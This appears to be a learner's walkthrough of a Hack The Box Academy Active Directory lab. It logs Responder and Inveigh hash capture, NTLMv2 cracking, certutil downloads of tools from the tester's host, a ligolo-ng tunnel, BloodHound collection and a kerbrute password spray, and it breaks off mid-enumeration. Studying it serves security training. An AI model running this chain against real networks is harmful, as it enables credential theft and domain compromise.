
# Brief

Our client Inlanefreight has contracted us again to perform a full-scope internal penetration test. The client is looking to find and remediate as many flaws as possible before going through a merger & acquisition process. The new CISO is particularly worried about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests. 

The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. 

Connect to the internal attack host via SSH (you can also connect to it using `xfreerdp` as shown in the beginning of this module) and begin looking for a foothold into the domain. Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.

Apply what you learned in this module to compromise the domain and answer the questions below to complete part II of the skills assessment.


# Questions

> SSH to 10.129.239.151 (ACADEMY-EA-PAR01-SA2) with user "htb-student" and password "HTB_@cademy_stdnt!"

1. Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?


```sh
# Connect to our attack box on Customer network
ssh htb-student@10.129.239.151
xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.239.151 /size:80% +clipboard

cd Documents

# To get a hash from nothing, while being in the network, we need to MiTM the traffic. How many interfaces do we have on the pivot host?
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b0:db:39 brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    inet 10.129.239.151/16 brd 10.129.255.255 scope global dynamic noprefixroute ens192
       valid_lft 3226sec preferred_lft 3226sec
    inet6 dead:beef::3eb1:6ad:d5d1:ff6/64 scope global dynamic noprefixroute 
       valid_lft 86396sec preferred_lft 14396sec
    inet6 fe80::bc8f:282b:bcf:7a74/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b0:eb:19 brd ff:ff:ff:ff:ff:ff
    altname enp19s0
    inet 172.16.7.240/23 brd 172.16.7.255 scope global noprefixroute ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::2957:2d31:5225:229a/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:4b:f5:15:bf brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever

# Start responder with default settings on the internal-facing interface and let it run for some time
sudo responder -I ens224

...
[*] [LLMNR]  Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT
[*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
[*] Skipping previously captured hash for INLANEFREIGHT\******
...
```


2. What is this user's cleartext password?

```sh
# Check responder logs
ls /usr/share/responder/logs/

Analyzer-Session.log  Poisoners-Session.log  SMB-NTLMv2-SSP-172.16.7.3.txt
Config-Responder.log  Responder-Session.log


# Read the file
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.7.3.txt 

******::INLANEFREIGHT:0c6498a2a4ac...00000000


# Copy the hash of one user and save into a file
cat ******_ntlmv2

******::INLANEFREIGHT:0c6498a2a4acd121:FC356D6ADC6D88DF...0000000000000


# Once we have a hash, attempt to crack it
hashcat -m 5600 ******_ntlmv2 /usr/share/wordlists/rockyou.txt 

Watchdog: Temperature abort trigger set to 90c
clCompileProgram(): CL_COMPILE_PROGRAM_FAILURE
error: unknown target CPU 'generic'
* Device #1: Kernel /usr/local/share/hashcat/OpenCL/shared.cl build failed.

Started: Mon May 12 19:02:52 2025
Stopped: Mon May 12 19:02:52 2025


# John?
john --wordlist=/usr/share/wordlists/rockyou.txt ******_ntlmv2

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
...
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```


Pivot machine died here. Had to reset and repeat the steps above one more time.

```sh
# Show the password
john AB920_ntlmv2 --show --format=netntlmv2
******:******:INLANEFREIGHT:0c6498a2a4acd121:FC356D6ADC6D88...000000000

1 password hash cracked, 0 left
```


3.  Submit the contents of the `C:\flag.txt` file on MS01.

```sh
# Who is MS01? How many machines are in this network?
for i in {1..254} ;do (ping -c 1 172.16.7.$i | grep "bytes from" &) ;done

64 bytes from 172.16.7.3: icmp_seq=1 ttl=128 time=0.565 ms
64 bytes from 172.16.7.50: icmp_seq=1 ttl=128 time=2.72 ms
64 bytes from 172.16.7.60: icmp_seq=1 ttl=128 time=0.959 ms
64 bytes from 172.16.7.240: icmp_seq=1 ttl=64 time=0.064 ms


# 240 is us. Based on the previous exercise, I am guessing 172.16.7.3 is the DC? But let's confirm that.
nmap -Pn -sCV -p- --open 172.16.7.3,50,60

Nmap scan report for inlanefreight.local (172.16.7.3)
Host is up (0.069s latency).
Not shown: 51292 closed tcp ports (conn-refused), 14221 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-12 23:25:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49752/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:b0:af (VMware)
| smb2-time: 
|   date: 2025-05-12T23:27:39
|_  start_date: N/A


Nmap scan report for 172.16.7.50
Host is up (0.075s latency).
Not shown: 52850 closed tcp ports (conn-refused), 12672 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-05-12T23:27:46+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: MS01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: MS01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2025-05-12T23:27:39+00:00
| ssl-cert: Subject: commonName=MS01.INLANEFREIGHT.LOCAL
| Not valid before: 2025-05-11T23:08:30
|_Not valid after:  2025-11-10T23:08:30
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: MS01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:a0:0f (VMware)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-05-12T23:27:39
|_  start_date: N/A

Nmap scan report for 172.16.7.60
Host is up (0.064s latency).
Not shown: 51461 closed tcp ports (conn-refused), 14062 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-05-12T23:27:46+00:00; 0s from scanner time.
| ms-sql-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: SQL01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: SQL01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-05-12T23:08:39
|_Not valid after:  2055-05-12T23:08:39
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-12T23:27:39
|_  start_date: N/A
|_nbstat: NetBIOS name: SQL01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:f9:48 (VMware)
| ms-sql-info: 
|   Windows server name: SQL01
|   172.16.7.60\SQLEXPRESS: 
|     Instance name: SQLEXPRESS
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|_    Clustered: false
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Post-scan script results:
| clock-skew: 
|   0s: 
|     172.16.7.50
|     172.16.7.3 (inlanefreight.local)
|_    172.16.7.60
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 402.36 seconds


# Confirmed. .3 is the DC. .50 = MS01. Validate credentials against DC
sudo crackmapexec smb 172.16.7.3 -u AB920 -p weasal

SMB         172.16.7.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.7.3      445    DC01             [+] INLANEFREIGHT.LOCAL\AB920:weasal 


# What are my permissions on MS01?
sudo crackmapexec smb 172.16.7.50 -u ****** -p ******


# Same as DC. Can only log in. What is your usefulness? How many users?
sudo crackmapexec smb 172.16.7.3 -u ****** -p ****** --users

# Wayyyy too many. Can I get a session with this user?
impacket-psexec INLANEFREIGHT.LOCAL/******:******@172.16.7.50

[*] Requesting shares on 172.16.7.50.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.


# Ok. Shares?
sudo crackmapexec smb 172.16.7.50 -u ****** -p ****** --shares


# Nothing interesting. I can Bloodhound the data to analyze. Instead of doing it manually. Can I kerberoast?
impacket-GetUserSPNs -dc-ip 172.16.7.3 INLANEFREIGHT.LOCAL/******

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
No entries found!


# I don't want to look into the hint. Can I RDP into the machine? 
# Start the RDP session to pivot host from Kali
xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.239.132 /size:80% +clipboard


# Then start the rdp inside the RDP session from Pivot host
xfreerdp /u:****** /p:****** /v:172.16.7.50 /size:50% +clipboard


# Ok. We can't copy the flag. :(  Evil-WinRM?
evil-winrm -i 172.16.7.50 -u ****** -p ******

...
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\******\Documents> 

*Evil-WinRM* PS C:\Users\******\Documents> cd C:\
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/25/2022  10:20 AM                PerfLogs
d-r---        4/11/2022  10:00 PM                Program Files
d-----         4/1/2022  10:11 AM                Program Files (x86)
d-r---        4/20/2022   6:51 AM                Users
d-----        4/20/2022   5:31 AM                Windows
-a----        4/11/2022  10:19 PM             24 flag.txt


*Evil-WinRM* PS C:\> type flag.txt
******


# Ok. Since we have nothing from that user. We need to upload Powerview.
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1

# Stage and download to Pwnbox
python3 -m http.server 8000

# On Pwnbox in customer network
wget http://10.10.14.196:8000/PowerView.ps1

# Open the RDP session, copy the file and paste into MS01. Then import
Import-Module .\PowerView.ps1

```


4. Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.

```sh
# Situational awareness
whoami /all

USER INFORMATION
----------------

User Name           SID
=================== =============================================
inlanefreight\****** S-1-5-21-3327542485-274640656-2609762496-4610


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.


# Download LaZagne on client Pwnbox 
wget
https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe

# Then transfer to MS01
*Evil-WinRM* PS C:\Users\******\Desktop> certutil -urlcache -f http://172.16.7.240:8000/LaZagne.exe LaZagne.exe

****  Online  ****
CertUtil: -URLCache command completed successfully.


# Run
Evil-WinRM* PS C:\Users\******\Desktop> .\LaZagne.exe all

...
[+] 0 passwords have been found.
For more information launch it again with the -v option

elapsed time = 2.515624523162842
*Evil-WinRM* PS C:\Users\******\Desktop> 


# Ok. We have NOTHING. Go back to traffic MiTM?
wget https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/refs/heads/master/Inveigh.ps1

python3 -m http.server 8000

wget http://10.10.14.196:8000/Inveigh.ps1

$python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

*Evil-WinRM* PS C:\Users\******\Desktop> certutil -urlcache -f http://172.16.7.240:8000/Inveigh.ps1 Inveigh.ps1
****  Online  ****
CertUtil: -URLCache command completed successfully.
*Evil-WinRM* PS C:\Users\******\Desktop> 


# Run
import-module .\Inveigh.ps1

*Evil-WinRM* PS C:\Users\******\Desktop> Invoke-Inveigh Y -NBNS Y -mDNS Y -Proxy Y -ConsoleOutput Y -FileOutput Y -IP 172.16.7.50

...
[+] Machine Account Capture = Disabled
[+] Console Output = Full
[+] File Output = Enabled
[+] Output Directory = C:\Users\AB920\Desktop
Warning: [!] Run Stop-Inveigh to stop
[*] Press any key to stop console output
Cannot see if a key has been pressed when either application does not have a console or when console input has been redirected from a file. Try Console.In.Peek.
...

*Evil-WinRM* PS C:\Users\******\Desktop> cat Inveigh-Log.txt

# Get data from Inveigh
*Evil-WinRM* PS C:\Users\******\Desktop> Get-Inveigh

[+] [2025-05-12T20:41:40] LLMNR request for INLANEFRIGHT received from 172.16.7.3 [response sent]
[+] [2025-05-12T20:41:40] NBNS request INLANEFRIGHT<20> received from 172.16.7.3 [response sent]
[+] [2025-05-12T20:43:41] LLMNR request for INLANEFRIGHT received from 172.16.7.3 [response sent]
[+] [2025-05-12T20:45:40] LLMNR request for INLANEFRIGHT received from 172.16.7.3 [response sent]

*Evil-WinRM* PS C:\Users\******\Desktop> Get-Inveigh -NTLMv2

# Nothing. Use the net8?
wget https://github.com/Kevin-Robertson/Inveigh/releases/download/v2.0.11/Inveigh-net8.0-win-x64-trimmed-single-v2.0.11.zip

# Transfer to target
Expand-Archive -Path "Inveigh-net8.0-win-x64-trimmed-single-v2.0.11.zip" -DestinationPath ".\Veigh"

```



# Resumed on 05/13/2025

```sh
# Download ligolo on Pwnbox
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.1/ligolo-ng_proxy_0.8.1_linux_amd64.tar.gz

wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.1/ligolo-ng_agent_0.8.1_linux_amd64.tar.gz

# Extract
tar -xzvf ligolo-ng_agent_0.8.1_linux_amd64.tar.gz 
LICENSE
README.md
agent

rm README.md LICENSE 

tar -xzvf ligolo-ng_proxy_0.8.1_linux_amd64.tar.gz 
LICENSE
README.md
proxy
rm LICENSE README.md 

# Connect to Pivot host
ssh htb-student@10.129.18.211

# Transfer agent 
python3 -m http.server 8000

┌─[htb-student@skills-par01]─[~]
└──╼ $wget http://10.10.14.196:8000/agent

# Set up the proxy
whoami
htb-ac-487515

sudo ip tuntap add user htb-ac-487515 mode tun ligolo
sudo ip link set ligolo up

# Verify
ip addr show

...
4: ligolo: <NO-CARRIER,POINTOPOINT,MULTICAST,NOARP,UP> mtu 1500 qdisc fq_codel state DOWN group default qlen 500
    link/none 


# Start the proxy
./proxy -selfcert


# Connect the agent in our pivot host
chmod +x agent 
./agent -connect 10.10.14.196:11601 -ignore-cert

WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.14.196:11601"


# On proxy tab, see
ligolo-ng » INFO[0141] Agent joined.                                 id=005056b0c3ba name=htb-student@skills-par01 remote="10.129.18.111:45288"
ligolo-ng » 
ligolo-ng » session
? Specify a session : 1 - htb-student@skills-par01 - 10.129.18.111:45288 - 005056b0c3ba
[Agent : htb-student@skills-par01] » ifconfig 
┌────────────────────────────────────┐
│ Interface 0                        │
├──────────────┬─────────────────────┤
│ Name         │ lo                  │
│ Hardware MAC │                     │
│ MTU          │ 65536               │
│ Flags        │ up|loopback|running │
│ IPv4 Address │ 127.0.0.1/8         │
│ IPv6 Address │ ::1/128             │
└──────────────┴─────────────────────┘
┌──────────────────────────────────────────────────┐
│ Interface 1                                      │
├──────────────┬───────────────────────────────────┤
│ Name         │ ens192                            │
│ Hardware MAC │ 00:50:56:b0:c3:ba                 │
│ MTU          │ 1500                              │
│ Flags        │ up|broadcast|multicast|running    │
│ IPv4 Address │ 10.129.18.111/16                  │
│ IPv6 Address │ dead:beef::2519:e2b2:f024:c686/64 │
│ IPv6 Address │ fe80::52d4:1105:dfc0:4018/64      │
└──────────────┴───────────────────────────────────┘
┌───────────────────────────────────────────────┐
│ Interface 2                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ ens224                         │
│ Hardware MAC │ 00:50:56:b0:0e:b8              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 172.16.7.240/23                │
│ IPv6 Address │ fe80::2957:2d31:5225:229a/64   │
└──────────────┴────────────────────────────────┘
┌───────────────────────────────────────┐
│ Interface 3                           │
├──────────────┬────────────────────────┤
│ Name         │ docker0                │
│ Hardware MAC │ 02:42:86:f5:36:6c      │
│ MTU          │ 1500                   │
│ Flags        │ up|broadcast|multicast │
│ IPv4 Address │ 172.17.0.1/16          │
└──────────────┴────────────────────────┘

# Add route to our target network
sudo ip route add 172.16.7.0/23 dev ligolo
Error: Invalid prefix for given prefix length.


# Can't Ligolo deal with bigger network? Wonder. Change the CIDR
sudo ip route add 172.16.7.0/24 dev ligolo


# Verify
ip route list

...
172.16.7.0/24 dev ligolo scope link linkdown 
...

# start the tunnel
[Agent : htb-student@skills-par01] » start
INFO[0815] Starting tunnel to htb-student@skills-par01 (005056b0c3ba) 


# Test
ping 172.16.7.50 -c 1

PING 172.16.7.50 (172.16.7.50) 56(84) bytes of data.
64 bytes from 172.16.7.50: icmp_seq=1 ttl=64 time=71.7 ms

--- 172.16.7.50 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 71.749/71.749/71.749/0.000 ms


# We are in. Let's connect back to MS01
evil-winrm -i 172.16.7.50 -u ****** -p ******


# Works as needed. Stopped yesterday at needing to capture network traffic. With Ligolo set up, can I capture straight from it? Wonder. Let's add a listener for files transfer
listener_add --addr 0.0.0.0:30000 --to 0.0.0.0:8000

[Agent : htb-student@skills-par01] » listener_add --addr 0.0.0.0:30000 --to 0.0.0.0:8000
INFO[1365] Listener 0 created on remote agent!     


# Download Inveigh and stage for transfer
wget https://github.com/Kevin-Robertson/Inveigh/releases/download/v2.0.11/Inveigh-net8.0-win-x64-trimmed-single-v2.0.11.zip

python3 -m http.server 8000

# On target
*Evil-WinRM* PS C:\Users\AB920\Documents> certutil -urlcache -f http://172.16.7.240:30000/Inveigh-net8.0-win-x64-trimmed-single-v2.0.11.zip Inveigh-net8.0-win-x64-trimmed-single-v2.0.11.zip

****  Online  ****
CertUtil: -URLCache command completed successfully.
*Evil-WinRM* PS C:\Users\AB920\Documents> 


# Extract
Expand-Archive -Path "Inveigh-net8.0-win-x64-trimmed-single-v2.0.11.zip" -DestinationPath ".\Veigh"

# Test 
.\Inveigh.exe -?

Control:
  -Inspect        Default=Disabled: (Y/N) inspect traffic only.
  -IPv4           Default=Enabled: (Y/N) IPv4 spoofing/capture.
...


# Run with the defaults and start capturing hashes
.\Inveigh.exe


# Failed. Permissions. Ok. So, I can't capture the hashes. What do I have left to get a user? Call bloodhound
sudo bloodhound-python -u '******' -p '******' -ns 172.16.7.3 -d INLANEFREIGHT.LOCAL -c all


INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: inlanefreight.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (DC01.INLANEFREIGHT.LOCAL:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 504 computers
INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL
INFO: Found 2902 users
INFO: Found 164 groups
INFO: Found 2 gpos
INFO: Found 21 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
...
WARNING: Could not resolve: ACADEMY-EA-HK-0639.INLANEFREIGHT.LOCAL: The DNS query name does not exist: ACADEMY-EA-HK-0639.INLANEFREIGHT.LOCAL.
INFO: Done in 00M 34S


ls

20250513083733_computers.json   20250513083733_gpos.json    20250513083733_users.json
20250513083733_containers.json  20250513083733_groups.json
20250513083733_domains.json     20250513083733_ous.json

# Zip to upload
zip -r inlanfreight *.json
  adding: 20250513083733_computers.json (deflated 99%)
  adding: 20250513083733_containers.json (deflated 95%)
  adding: 20250513083733_domains.json (deflated 77%)
  adding: 20250513083733_gpos.json (deflated 86%)
  adding: 20250513083733_groups.json (deflated 97%)
  adding: 20250513083733_ous.json (deflated 96%)
  adding: 20250513083733_users.json (deflated 98%)


# Start the console and set up password if this is the first time
sudo neo4j start

...
Starting Neo4j.
Started neo4j (pid:87005). It is available at http://localhost:7474
There may be a short delay until the server is ready.


# Start bloodhound
bloodhound


# Authentication refused on Pwnbox. WHAT IS THIS!!!!!!!!!! Filter using JQ
cat 20250513083733_users.json | jq '.data[].Properties.samaccountname' | tr -d '"' > valid_users.txt

wc -l valid_users.txt 
2902 valid_users.txt


# SPRAYYYYYY!
sudo crackmapexec smb 172.16.7.3 -u valid_users.txt -p Password123 | grep +


# CME was taking FOREVER and ended up killing my agent. So, I downloaded kerbrute and used it instead
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64

chmod +x kerbrute_linux_amd64

./kerbrute_linux_amd64 passwordspray -d inlanefreight.local --dc 172.16.7.3 part2/valid_users.txt Password123

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/13/25 - Ronnie Flathers @ropnop

2025/05/13 09:11:57 >  Using KDC(s):
2025/05/13 09:11:57 >  	172.16.7.3:88

2025/05/13 09:14:16 >  Done! Tested 2902 logins (0 successes) in 139.447 seconds


# Change password
./kerbrute_linux_amd64 passwordspray -d inlanefreight.local --dc 172.16.7.3 part2/valid_users.txt Welcome01

2025/05/13 09:15:02 >  	172.16.7.3:88

2025/05/13 09:17:39 >  Done! Tested 2902 logins (0 successes) in 156.505 seconds


# Change to Welcome1
./kerbrute_linux_amd64 passwordspray -d inlanefreight.local --dc 172.16.7.3 part2/valid_users.txt Welcome1


2025/05/13 09:18:49 >  Using KDC(s):
2025/05/13 09:18:49 >  	172.16.7.3:88

2025/05/13 09:21:54 >  [+] VALID LOGIN:	 ******@inlanefreight.local:Welcome1
2025/05/13 09:22:05 >  Done! Tested 2902 logins (1 successes) in 195.719 seconds


# Validate credentials
sudo crackmapexec smb 172.16.7.3 -u ****** -p Welcome1

SMB         172.16.7.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.7.3      445    DC01             [+] INLANEFREIGHT.LOCAL\******:Welcome1 
```


5. What is this user's password?

```sh
See above
```


6. Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?

```sh
# What does that even mean?
sudo crackmapexec smb 172.16.7.50 -u ****** -p Welcome1
SMB         172.16.7.50     445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.7.50     445    MS01             [+] INLANEFREIGHT.LOCAL\BR086:Welcome1 

sudo crackmapexec smb 172.16.7.60 -u ****** -p Welcome1
SMB         172.16.7.60     445    SQL01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.7.60     445    SQL01            [+] INLANEFREIGHT.LOCAL\BR086:Welcome1 


# Do I need to log into SQL01? 
evil-winrm -i 172.16.7.60 -u ****** -p Welcome1

rror: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1


# RDP?
xfreerdp /u:****** /p:Welcome1 /v:172.16.7.60 /size:80% +clipboard

[09:32:29:328] [157318:157319] [ERROR][com.freerdp.core] - freerdp_post_connect failed


# Shares?
sudo crackmapexec smb 172.16.7.50 -u ****** -p Welcome1 --shares

SMB         172.16.7.50     445    MS01             [*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC


sudo crackmapexec smb 172.16.7.60 -u ****** -p Welcome1 --shares

SMB         172.16.7.60     445    SQL01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.7.60     445    SQL01            [+] INLANEFREIGHT.LOCAL\BR086:Welcome1 
SMB         172.16.7.60     445    SQL01            [*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
